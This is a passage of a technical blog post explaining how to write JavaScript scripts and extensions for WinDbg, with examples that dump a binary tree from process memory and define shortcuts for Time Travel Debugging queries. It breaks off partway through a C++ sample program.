      <content:encoded><![CDATA[<h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>Hello, this is <strong>pwndorei</strong>&#x2026; Since I started working at a company around last September, I&#x2019;ve stopped writing research posts for a while, but now I can&#x2019;t avoid it anymore so I&#x2019;m back &#x1F926;&#x1F3FB;&#x200D;&#x2642;&#xFE0F;. However, aside from work, I don&#x2019;t really have anything I&#x2019;m researching, so no topic came to mind that was worth writing about.<br>So I decided to simply present a JavaScript script that&#x2019;s handy when analyzing with WinDbg. All right, let&#x2019;s go!</p><h1 id="Windbg-Script-&#x21D2;"><a href="#Windbg-Script-&#x21D2;" class="headerlink" title="Windbg + Script &#x21D2; ?"></a>Windbg + Script &#x21D2; ?</h1><p>Using a script for debugging? The goal is one and the same&#x2014;to debug lazily.</p><p><img src="/2025/06/01/pwndorei/windbg_js_en/image.png" alt="image.png"></p><blockquote><p><del>It&#x2019;s absolutely <em>not</em> about working hard in advance so you can relax later</del></p></blockquote><p>Of course, you <em>can</em> carefully <code>dq</code>, <code>dd</code>, etc. every single time to check what data lives in a crazy-looking data structure. And with TTD, even if you accidentally step over an important call, you don&#x2019;t have to relaunch the process, so you can just smash <strong>F10</strong> mindlessly while analyzing.<br>But! The larger the data gets, the less time it takes to write a script instead of doing it by hand, and if you rely on TTD too much you&#x2019;ll turn into a fool.<br>So today, with a simple example, we&#x2019;ll see how to use scripts effectively&#x2014;and as a bonus I&#x2019;ll also show you how to push TTD to the limit.</p><h1 id="Windbg-Script-Basic"><a href="#Windbg-Script-Basic" class="headerlink" title="Windbg Script Basic"></a>Windbg Script Basic</h1><p>In WinDbg you can create a new script or load an existing one from the <strong>Scripting</strong> menu, like below. Besides JavaScript there&#x2019;s something called <strong>NatVis</strong>, but since we&#x2019;re going to use JavaScript we&#x2019;ll just ignore that.</p><p><img src="/2025/06/01/pwndorei/windbg_js_en/image%201.png" alt="image.png"></p><p>Next, in <strong>New Script</strong> you choose between <strong>Extension</strong> and <strong>Imperative</strong>; it&#x2019;s merely a difference in the default template.</p><p>For <strong>Imperative</strong>, the following boilerplate code is generated:</p><pre><code class="hljs jsx"><span class="hljs-meta">&quot;use strict&quot;</span>;<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">initializeScript</span>(<span class="hljs-params"></span>)</span><span class="hljs-function"></span>{    <span class="hljs-keyword">return</span> [<span class="hljs-keyword">new</span> host.apiVersionSupport(<span class="hljs-number">1</span>, <span class="hljs-number">9</span>)];}<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">invokeScript</span>(<span class="hljs-params"></span>)</span><span class="hljs-function"></span>{    <span class="hljs-comment">//</span>    <span class="hljs-comment">// Insert your script content here.  This method will be called whenever the script is</span>    <span class="hljs-comment">// invoked from a client.</span>    <span class="hljs-comment">//</span>    <span class="hljs-comment">// See the following for more details:</span>    <span class="hljs-comment">//</span>    <span class="hljs-comment">//     https://aka.ms/JsDbgExt</span>    <span class="hljs-comment">//</span>}</code></pre><p>You can run it by pressing <strong>Execute</strong> in <strong>Actions</strong> or with commands such as <code>.scriptrun</code>.</p><p><img src="/2025/06/01/pwndorei/windbg_js_en/image%202.png" alt="image.png"></p><p>For <strong>Extension</strong>, it&#x2019;s used literally to add extension functionality, and this template appears:</p><pre><code class="hljs jsx"><span class="hljs-meta">&quot;use strict&quot;</span>;<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">initializeScript</span>(<span class="hljs-params"></span>)</span><span class="hljs-function"></span>{    <span class="hljs-comment">//</span>    <span class="hljs-comment">// Return an array of registration objects to modify the object model of the debugger</span>    <span class="hljs-comment">// See the following for more details:</span>    <span class="hljs-comment">//</span>    <span class="hljs-comment">//     https://aka.ms/JsDbgExt</span>    <span class="hljs-comment">//</span>    <span class="hljs-keyword">return</span> [<span class="hljs-keyword">new</span> host.apiVersionSupport(<span class="hljs-number">1</span>, <span class="hljs-number">9</span>)];}</code></pre><p>Extensions added through a script can be invoked in WinDbg with a command like <code>!extname</code>.</p><p>We&#x2019;ll see what functions we can implement through examples later, but first a few more script-related commands:</p><ul><li><p><code>.scriptlist</code><br>Shows all currently loaded scripts.</p><pre><code class="hljs routeros">0:038&gt; .scriptlistCommand Loaded Scripts:        <span class="hljs-built_in">..</span>.    JavaScript<span class="hljs-built_in"> script </span><span class="hljs-keyword">from</span> <span class="hljs-string">&apos;D:\windbg_Ext\utils.js&apos;</span>    JavaScript<span class="hljs-built_in"> script </span><span class="hljs-keyword">from</span> <span class="hljs-string">&apos;D:\windbg_Ext\codecov.js&apos;</span>    JavaScript<span class="hljs-built_in"> script </span><span class="hljs-keyword">from</span> <span class="hljs-string">&apos;C:\Program Files\WindowsApps\Microsoft.WinDbg_1.2504.15001.0_x64__8wekyb3d8bbwe\amd64\winext\ApiExtension\CodeFlow.js&apos;</span>Other Clients<span class="hljs-string">&apos; Scripts:</span><span class="hljs-string">    Script named &apos;</span>untitled0<span class="hljs-string">&apos;</span><span class="hljs-string">    Script named &apos;</span>untitled1<span class="hljs-string">&apos;</span></code></pre></li><li><p><code>.scriptload</code> &amp; <code>.scriptunload</code><br>Commands to load or unload a script.<br>When loading, you can give the full path or just the name; WinDbg searches any directories in the <code>PATH</code> environment variable.<br><code>.scriptload</code> only calls the script&#x2019;s <code>initializeScript</code> function.</p></li><li><code>.scriptrun</code><br>Unlike <code>.scriptload</code>, it also calls the <code>invokeScript</code> function.</li></ul><p>There are two commands&#x2014;<code>.scriptload</code> and <code>.scriptrun</code>&#x2014;that execute scripts. If the script is <strong>imperative</strong>, you need to run <code>invokeScript</code>, so you use <strong>run</strong>; if it&#x2019;s an <strong>extension</strong>, you use <strong>load</strong>, right?</p><p><img src="/2025/06/01/pwndorei/windbg_js_en/image%203.png" alt="image.png"></p><h2 id="Hello-World"><a href="#Hello-World" class="headerlink" title="Hello World"></a>Hello World</h2><p>We&#x2019;re not learning a <em>new</em> language, but because we can&#x2019;t use <code>console.log</code> the way we do in the browser, let&#x2019;s start by printing &#x201C;Hello World&#x201D; to the console.</p><pre><code class="hljs jsx"><span class="hljs-meta">&quot;use strict&quot;</span>;<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">initializeScript</span>(<span class="hljs-params"></span>)</span><span class="hljs-function"></span>{    <span class="hljs-keyword">return</span> [<span class="hljs-keyword">new</span> host.apiVersionSupport(<span class="hljs-number">1</span>, <span class="hljs-number">9</span>)];}<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">invokeScript</span>(<span class="hljs-params"></span>)</span><span class="hljs-function"></span>{    host.diagnostics.debugLog(<span class="hljs-string">&quot;Hello World!\n&quot;</span>)}</code></pre><p>As you can see, you use <code>host.diagnostics.debugLog</code> instead of <code>console.log</code>. If you run it, it prints normally.</p><p><img src="/2025/06/01/pwndorei/windbg_js_en/image%204.png" alt="image.png"></p><p>Since I have no intention of typing that code every time I need to log, let&#x2019;s make an alias and use that instead &#x1F923;</p><pre><code class="hljs jsx"><span class="hljs-meta">&quot;use strict&quot;</span>;<span class="hljs-keyword">const</span> log = <span class="hljs-function"><span class="hljs-params">x</span> =&gt;</span> host.diagnostics.debugLog(x)<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">initializeScript</span>(<span class="hljs-params"></span>)</span><span class="hljs-function"></span>{    <span class="hljs-keyword">return</span> [<span class="hljs-keyword">new</span> host.apiVersionSupport(<span class="hljs-number">1</span>, <span class="hljs-number">9</span>)];}<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">invokeScript</span>(<span class="hljs-params"></span>)</span><span class="hljs-function"></span>{    log(<span class="hljs-string">&quot;Hello World!\n&quot;</span>)}</code></pre><h2 id="Read-amp-Write-Memory"><a href="#Read-amp-Write-Memory" class="headerlink" title="Read &amp; Write Memory"></a>Read &amp; Write Memory</h2><p>We&#x2019;re not going to write scripts just to print &#x201C;Hello World&#x201D;, right? <code>host.memory</code> has the following functions, which let you read and write data in memory:</p><ul><li><code>readMemoryValues</code></li><li><code>readWideString</code></li><li><code>readString</code></li><li><code>writeMemoryValues</code></li></ul><p>For today, knowing this much is plenty!</p><h1 id="Practice"><a href="#Practice" class="headerlink" title="Practice"></a>Practice</h1><p>Now let&#x2019;s debug a sample program and see in what situations a script is useful.</p><h2 id="1-Dump-Data-Structure"><a href="#1-Dump-Data-Structure" class="headerlink" title="1. Dump Data Structure"></a>1. Dump Data Structure</h2><p>First up is dumping the data structure we mentioned earlier. ChatGPT made the sample program like this:</p><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Node</span> {</span>    <span class="hljs-keyword">char</span>* word;    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Node</span>* <span class="hljs-title">left</span>;</span>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Node</span>* <span class="hljs-title">right</span>;</span>} Node;<span class="hljs-function">Node* <span class="hljs-title">createNode</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>* word)</span> </span>{    Node* newNode = (Node*)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(Node));    <span class="hljs-keyword">if</span> (!newNode) <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;    newNode-&gt;word = _strdup(word);    newNode-&gt;left = <span class="hljs-literal">NULL</span>;    newNode-&gt;right = <span class="hljs-literal">NULL</span>;    <span class="hljs-keyword">return</span> newNode;}<span class="hljs-function">Node* <span class="hljs-title">insert</span><span class="hljs-params">(Node* root, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>* word)</span> </span>{    <span class="hljs-keyword">if</span> (root == <span class="hljs-literal">NULL</span>) {        <span class="hljs-keyword">return</span> createNode(word);    }    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span>(word, root-&gt;word) &lt; <span class="hljs-number">0</span>) {        root-&gt;left = insert(root-&gt;left, word);    } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span>(word, root-&gt;word) &gt; <span class="hljs-number">0</span>) {        root-&gt;right = insert(root-&gt;right, word);    }    <span class="hljs-keyword">return</span> root;}<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">inorderTraversal</span><span class="hljs-params">(Node* root)</span> </span>{    <span class="hljs-keyword">if</span> (root != <span class="hljs-literal">NULL</span>) {        inorderTraversal(root-&gt;left);        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s\n&quot;</span>, root-&gt;word);        inorderTraversal(root-&gt;right);    }}<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">freeTree</span><span class="hljs-params">(Node* root)</span> </span>{    <span class="hljs-keyword">if</span> (root != <span class="hljs-literal">NULL</span>) {        freeTree(root-&gt;left);        freeTree(root-&gt;right);        <span class="hljs-built_in">free</span>(root-&gt;word);        <span class="hljs-built_in">free</span>(root);    }}<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>{    <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>* words[<span class="hljs-number">10</span>] = {        <span class="hljs-string">&quot;banana&quot;</span>, <span class="hljs-string">&quot;apple&quot;</span>, <span class="hljs-string">&quot;grape&quot;</span>, <span class="hljs-string">&quot;orange&quot;</span>, <span class="hljs-string">&quot;kiwi&quot;</span>,        <span class="hljs-string">&quot;peach&quot;</span>, <span class="hljs-string">&quot;lemon&quot;</span>, <span class="hljs-string">&quot;mango&quot;</span>, <span class="hljs-string">&quot;cherry&quot;</span>, <span class="hljs-string">&quot;melon&quot;</span>    };    Node* root = <span class="hljs-literal">NULL</span>;    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10</span>; i++) {        root = insert(root, words[i]);    }    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Address of root node: %p\n&quot;</span>, (<span class="hljs-keyword">void</span>*)root);    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Press Enter to exit...&quot;</span>);    getchar();    freeTree(root);    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;}</code></pre><p>It&#x2019;s simple code that stores strings in a binary tree in order. It prints the root node&#x2019;s address and waits for console input. We can attach the debugger and write a script that traverses the tree to print the data.</p><p><img src="/2025/06/01/pwndorei/windbg_js_en/image%205.png" alt="image.png"></p><p>A <code>Node</code> is a 0x18-byte structure with three pointer fields, so I defined <code>getNode</code> like this:</p><pre><code class="hljs jsx"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getNode</span>(<span class="hljs-params">addr</span>)</span>{    <span class="hljs-keyword">var</span> node = host.memory.readMemoryValues(addr, <span class="hljs-number">3</span>, <span class="hljs-number">8</span>)    <span class="hljs-keyword">return</span> {        <span class="hljs-string">&quot;word&quot;</span>: node[<span class="hljs-number">0</span>],        <span class="hljs-string">&quot;left&quot;</span>: node[<span class="hljs-number">1</span>],        <span class="hljs-string">&quot;right&quot;</span>: node[<span class="hljs-number">2</span>]    }}</code></pre><p>Reading memory is done with <code>host.memory.readMemoryValues</code>. As you can guess from the parameters, it reads 3 elements (second parameter) of 8 bytes each (third parameter, <code>elementSize</code>) starting at <code>addr</code>. The return value is an array of integers containing the data, and I use it to build a node object.</p><p>Now that we can use the <code>Node</code> structure stored in memory, we need a traversal function. Below is a simple in-order traversal: given a node returned by <code>getNode</code>, it reads the string at <code>word</code> and prints it.</p><pre><code class="hljs jsx"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">traverse</span>(<span class="hljs-params">node</span>)</span>{    <span class="hljs-keyword">if</span>(node[<span class="hljs-string">&quot;left&quot;</span>] != <span class="hljs-number">0</span>) traverse(getNode(node[<span class="hljs-string">&quot;left&quot;</span>]))    log(host.memory.readString(node[<span class="hljs-string">&quot;word&quot;</span>]) + <span class="hljs-string">&quot;\n&quot;</span>)    <span class="hljs-keyword">if</span>(node[<span class="hljs-string">&quot;right&quot;</span>] != <span class="hljs-number">0</span>) traverse(getNode(node[<span class="hljs-string">&quot;right&quot;</span>]))}</code></pre><p>To read a string, use <code>host.memory.readString</code> like above. If it were a wide string, you&#x2019;d use <code>readWideString</code> instead. The full script is:</p><pre><code class="hljs jsx"><span class="hljs-meta">&quot;use strict&quot;</span>;<span class="hljs-keyword">const</span> log = <span class="hljs-function"><span class="hljs-params">x</span> =&gt;</span> host.diagnostics.debugLog(x)<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">initializeScript</span>(<span class="hljs-params"></span>)</span><span class="hljs-function"></span>{    <span class="hljs-keyword">return</span> [<span class="hljs-keyword">new</span> host.apiVersionSupport(<span class="hljs-number">1</span>, <span class="hljs-number">9</span>)];}<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getNode</span>(<span class="hljs-params">addr</span>)</span>{    <span class="hljs-keyword">var</span> node = host.memory.readMemoryValues(addr, <span class="hljs-number">3</span>, <span class="hljs-number">8</span>)    <span class="hljs-keyword">return</span> {        <span class="hljs-string">&quot;word&quot;</span>: node[<span class="hljs-number">0</span>],        <span class="hljs-string">&quot;left&quot;</span>: node[<span class="hljs-number">1</span>],        <span class="hljs-string">&quot;right&quot;</span>: node[<span class="hljs-number">2</span>]    }}<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">traverse</span>(<span class="hljs-params">node</span>)</span>{    <span class="hljs-keyword">if</span>(node[<span class="hljs-string">&quot;left&quot;</span>] != <span class="hljs-number">0</span>) traverse(getNode(node[<span class="hljs-string">&quot;left&quot;</span>]))    log(host.memory.readString(node[<span class="hljs-string">&quot;word&quot;</span>]) + <span class="hljs-string">&quot;\n&quot;</span>)    <span class="hljs-keyword">if</span>(node[<span class="hljs-string">&quot;right&quot;</span>] != <span class="hljs-number">0</span>) traverse(getNode(node[<span class="hljs-string">&quot;right&quot;</span>]))}<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">invokeScript</span>(<span class="hljs-params"></span>)</span><span class="hljs-function"></span>{    traverse(getNode(<span class="hljs-number">0x25DD2C211C0</span>))}</code></pre><p>If you want to go beyond simple printing and, say, find the address where specific data is located, just add a condition and print it out:</p><pre><code class="hljs jsx"><span class="hljs-meta">&quot;use strict&quot;</span>;<span class="hljs-keyword">const</span> log = <span class="hljs-function"><span class="hljs-params">x</span> =&gt;</span> host.diagnostics.debugLog(x)<span class="hljs-keyword">const</span> dat = <span class="hljs-string">&quot;melon&quot;</span><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">initializeScript</span>(<span class="hljs-params"></span>)</span><span class="hljs-function"></span>{    <span class="hljs-keyword">return</span> [<span class="hljs-keyword">new</span> host.apiVersionSupport(<span class="hljs-number">1</span>, <span class="hljs-number">9</span>)];}<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getNode</span>(<span class="hljs-params">addr</span>)</span>{    <span class="hljs-keyword">var</span> node = host.memory.readMemoryValues(addr, <span class="hljs-number">3</span>, <span class="hljs-number">8</span>)    <span class="hljs-keyword">return</span> {        <span class="hljs-string">&quot;word&quot;</span>: node[<span class="hljs-number">0</span>],        <span class="hljs-string">&quot;left&quot;</span>: node[<span class="hljs-number">1</span>],        <span class="hljs-string">&quot;right&quot;</span>: node[<span class="hljs-number">2</span>]    }}<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">traverse</span>(<span class="hljs-params">addr</span>)</span>{    <span class="hljs-keyword">var</span> node = getNode(addr)    <span class="hljs-keyword">if</span>(node[<span class="hljs-string">&quot;left&quot;</span>] != <span class="hljs-number">0</span>) traverse(node[<span class="hljs-string">&quot;left&quot;</span>])    <span class="hljs-keyword">if</span>(dat.localeCompare(host.memory.readString(node[<span class="hljs-string">&quot;word&quot;</span>])) == <span class="hljs-number">0</span>){        log(<span class="hljs-string">&quot;Found at &quot;</span> + addr.toString(<span class="hljs-number">16</span>) + <span class="hljs-string">&quot;\n&quot;</span>)    }    <span class="hljs-keyword">if</span>(node[<span class="hljs-string">&quot;right&quot;</span>] != <span class="hljs-number">0</span>) traverse(node[<span class="hljs-string">&quot;right&quot;</span>])}<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">invokeScript</span>(<span class="hljs-params"></span>)</span><span class="hljs-function"></span>{    traverse(<span class="hljs-number">0x25DD2C211C0</span>)}</code></pre><p>This script checks whether the string &#x201C;melon&#x201D; is stored, and if so prints its address. Result:</p><pre><code class="hljs apache"><span class="hljs-attribute">Found</span> at <span class="hljs-number">25</span>dd<span class="hljs-number">2</span>c<span class="hljs-number">21280</span><span class="hljs-attribute">0</span>:<span class="hljs-number">004</span>&gt; da poi(<span class="hljs-number">25</span>dd<span class="hljs-number">2</span>c<span class="hljs-number">21280</span>)<span class="hljs-attribute">0000025d</span>`d<span class="hljs-number">2</span>c<span class="hljs-number">19360</span>  <span class="hljs-string">&quot;melon&quot;</span></code></pre><h2 id="2-TTD"><a href="#2-TTD" class="headerlink" title="2. TTD"></a>2. TTD</h2><p>We&#x2019;ve used an <strong>imperative</strong> script, so now it&#x2019;s the <strong>extension</strong>&#x2019;s turn. For the extension example, here&#x2019;s a simple script I always use with TTD:</p><pre><code class="hljs jsx"><span class="hljs-meta">&apos;use strict&apos;</span>;<span class="hljs-keyword">const</span> log = host.diagnostics.debugLog;<span class="hljs-keyword">const</span> logln = <span class="hljs-function"><span class="hljs-params">p</span> =&gt;</span> host.diagnostics.debugLog(p + <span class="hljs-string">&apos;\n&apos;</span>);<span class="hljs-keyword">const</span> hex = <span class="hljs-function"><span class="hljs-params">p</span> =&gt;</span> p.toString(<span class="hljs-number">16</span>);<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__calls</span>(<span class="hljs-params">...args</span>)</span>{<span class="hljs-keyword">return</span> host.currentSession.TTD.Calls(...args)}<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__memory</span>(<span class="hljs-params">...args</span>)</span>{<span class="hljs-keyword">return</span> host.currentSession.TTD.Memory(...args)}<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__memoryforpositionrange</span>(<span class="hljs-params">...args</span>)</span><span class="hljs-function"></span>{<span class="hljs-keyword">return</span> host.currentSession.TTD.MemoryForPositionRange(...args);}<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">ttdParsePosition</span>(<span class="hljs-params">pos</span>)</span>{<span class="hljs-keyword">var</span> sequence = <span class="hljs-number">0</span><span class="hljs-keyword">var</span> steps = <span class="hljs-number">0</span><span class="hljs-keyword">if</span>(<span class="hljs-keyword">typeof</span>(pos) == <span class="hljs-string">&quot;string&quot;</span>){sequence = <span class="hljs-built_in">parseInt</span>(pos.split(<span class="hljs-string">&quot;:&quot;</span>)[<span class="hljs-number">0</span>], <span class="hljs-number">16</span>)steps = <span class="hljs-built_in">parseInt</span>(pos.split(<span class="hljs-string">&quot;:&quot;</span>)[<span class="hljs-number">1</span>], <span class="hljs-number">16</span>)}<span class="hljs-keyword">else</span>{sequence = pos.Sequencesteps = pos.Steps}<span class="hljs-keyword">return</span> {Sequence: sequence,Steps: steps}}<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__ttd_position_compare</span>(<span class="hljs-params">pos1, pos2</span>)</span>{<span class="hljs-comment">/*</span><span class="hljs-comment">alias: poscmp</span><span class="hljs-comment">parameters:</span><span class="hljs-comment">pos1 &amp; pos2: Position object or string(Sequence:Steps in hexadicimal)</span><span class="hljs-comment">usage:</span><span class="hljs-comment">&gt; !poscmp(pos1, pos2)</span><span class="hljs-comment">&gt; dx @$poscmp(pos1, pos2)</span><span class="hljs-comment">example:</span><span class="hljs-comment">&gt; dx @$calls(&quot;function&quot;).Where(x =&gt; @$poscmp(&quot;17C83A:1777&quot;, x.TimeStart) &lt; 0).Where(x =&gt; @$poscmp(&quot;17C861:1B3A&quot;, x.TimeEnd) &gt; 0)</span><span class="hljs-comment">=&gt; get all `function` calls between 17C83A:1777 and 17C861:1B3A</span><span class="hljs-comment">*/</span>pos1 = ttdParsePosition(pos1)pos2 = ttdParsePosition(pos2)<span class="hljs-keyword">if</span>(pos1.Sequence != pos2.Sequence){<span class="hljs-keyword">return</span> pos1.Sequence - pos2.Sequence}<span class="hljs-keyword">return</span> pos1.Steps - pos2.Steps}<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__d</span>(<span class="hljs-params">...args</span>)</span>{<span class="hljs-keyword">return</span> host.memory.readMemoryValues(...args)}<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">initializeScript</span>(<span class="hljs-params"></span>) </span>{    <span class="hljs-keyword">return</span> [        <span class="hljs-keyword">new</span> host.apiVersionSupport(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>),        <span class="hljs-keyword">new</span> host.functionAlias(            __calls,            <span class="hljs-string">&apos;calls&apos;</span>        ),<span class="hljs-keyword">new</span> host.functionAlias(__memory,<span class="hljs-string">&apos;memory&apos;</span>),<span class="hljs-keyword">new</span> host.functionAlias(__memoryforpositionrange,<span class="hljs-string">&apos;memoryrange&apos;</span>),<span class="hljs-keyword">new</span> host.functionAlias(__ttd_position_compare,<span class="hljs-string">&apos;poscmp&apos;</span>),<span class="hljs-keyword">new</span> host.functionAlias(__d,<span class="hljs-string">&apos;d&apos;</span>)    ];}</code></pre><p>See the main difference from an <strong>imperative</strong> script? In <code>initializeScript</code> I create aliases with <code>host.functionAlias</code>. An extension registers JavaScript functions as aliases so they can be used directly at the command line.</p><p>I shorten the frequently used <code>@$cursession.TTD.Calls</code> and <code>@$cursession.TTD.Memory</code> to <code>@$calls</code> and <code>@$memory</code> to save my fingers &#x1F60E;</p><pre><code class="hljs jsx"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__calls</span>(<span class="hljs-params">...args</span>)</span>{<span class="hljs-keyword">return</span> host.currentSession.TTD.Calls(...args)}<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__memory</span>(<span class="hljs-params">...args</span>)</span>{<span class="hljs-keyword">return</span> host.currentSession.TTD.Memory(...args)}</code></pre><p>So where do we use this?</p><h3 id="TTD-Calls-amp-Memory"><a href="#TTD-Calls-amp-Memory" class="headerlink" title="TTD Calls &amp; Memory"></a>TTD Calls &amp; Memory</h3><p><a href="https://hackyboiz.github.io/2021/03/14/fabu1ous/ttd-3/#Filtering-in-a-query">The Time-Traveling Hacker&#x2019;s Guide</a> by Fabu1ous briefly explains Calls and Memory, but only skims over what you can do. Let&#x2019;s see how to use them through an example.</p><p>First, load the extension with the script below:</p><pre><code class="hljs routeros">0:038&gt; .scriptload utils.jsJavaScript<span class="hljs-built_in"> script </span>successfully loaded <span class="hljs-keyword">from</span> <span class="hljs-string">&apos;D:\windbg_Ext\utils.js&apos;</span></code></pre><p>Then you can access Calls and Memory like this:</p><pre><code class="hljs angelscript"><span class="hljs-number">0</span>:<span class="hljs-number">000</span>&gt; !calls <span class="hljs-string">&quot;kernelbase!CreateFileW&quot;</span>@$calls(<span class="hljs-string">&quot;kernelbase!CreateFileW&quot;</span>)                    [<span class="hljs-number">0x0</span>]               [<span class="hljs-number">0x1</span>]               ...<span class="hljs-number">0</span>:<span class="hljs-number">000</span>&gt; dx @$calls(<span class="hljs-string">&quot;kernelbase!CreateFileW&quot;</span>)[<span class="hljs-number">0</span>]@$calls(<span class="hljs-string">&quot;kernelbase!CreateFileW&quot;</span>)[<span class="hljs-number">0</span>]                    EventType        : <span class="hljs-number">0x0</span>    ThreadId         : <span class="hljs-number">0xe5c</span>    UniqueThreadId   : <span class="hljs-number">0x2</span>    TimeStart        : <span class="hljs-number">6</span>F4F:<span class="hljs-number">1742</span> [Time Travel]    TimeEnd          : <span class="hljs-number">6</span>F57:<span class="hljs-number">7E3</span> [Time Travel]    Function         : kernelbase!CreateFileW    FunctionAddress  : <span class="hljs-number">0x7ffbf27f05f0</span>    ReturnAddress    : <span class="hljs-number">0x7ffbf2835846</span>    ReturnValue      : <span class="hljs-number">0x31c</span>    Parameters          SystemTimeStart  : Fri May <span class="hljs-number">30</span> <span class="hljs-number">2025</span> <span class="hljs-number">09</span>:<span class="hljs-number">13</span>:<span class="hljs-number">24.782</span>    SystemTimeEnd    : Fri May <span class="hljs-number">30</span> <span class="hljs-number">2025</span> <span class="hljs-number">09</span>:<span class="hljs-number">13</span>:<span class="hljs-number">24.782</span></code></pre><p><code>!calls</code> does not let you directly index the returned array, so I more often use <code>dx @$calls</code>.</p><p>Now let&#x2019;s take a TTD recording of the example below and see what we can do.</p><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;vector&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;memory&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;random&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;cstdlib&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;ctime&gt;</span></span><span class="hljs-comment">// Base class</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BaseProcessor</span> {</span><span class="hljs-keyword">public</span>:    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">process</span><span class="hljs-params">(<span class="hljs-keyword">int</span> value)</span> </span>= <span class="hljs-number">0</span>;    <span class="hljs-keyword">virtual</span> ~BaseProcessor() = <span class="hljs-keyword">default</span>;};<span class="hljs-comment">// Derived class with actual behavior</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ConcreteProcessor</span> :</span> <span class="hljs-keyword">public</span> BaseProcessor {<span class="hljs-keyword">public</span>:    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">process</span><span class="hljs-params">(<span class="hljs-keyword">int</span> value)</span> <span class="hljs-keyword">override</span> </span>{        <span class="hljs-comment">// Dummy operation to prevent optimization</span>        <span class="hljs-keyword">volatile</span> <span class="hljs-keyword">int</span> sink = value;        (<span class="hljs-keyword">void</span>)sink; <span class="hljs-comment">// Prevent unused variable warning</span>    }};<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>{    <span class="hljs-built_in">std</span>::srand(<span class="hljs-keyword">static_cast</span>&lt;<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>&gt;(<span class="hljs-built_in">std</span>::time(<span class="hljs-literal">nullptr</span>)));    <span class="hljs-function"><span class="hljs-built_in">std</span>::mt19937 <span class="hljs-title">rng</span><span class="hljs-params">(<span class="hljs-built_in">std</span>::random_device{}())</span></span>;    <span class="hljs-function"><span class="hljs-built_in">std</span>::uniform_int_distribution&lt;<span class="hljs-keyword">int</span>&gt; <span class="hljs-title">distIndex</span><span class="hljs-params">(<span class="hljs-number">0</span>, <span 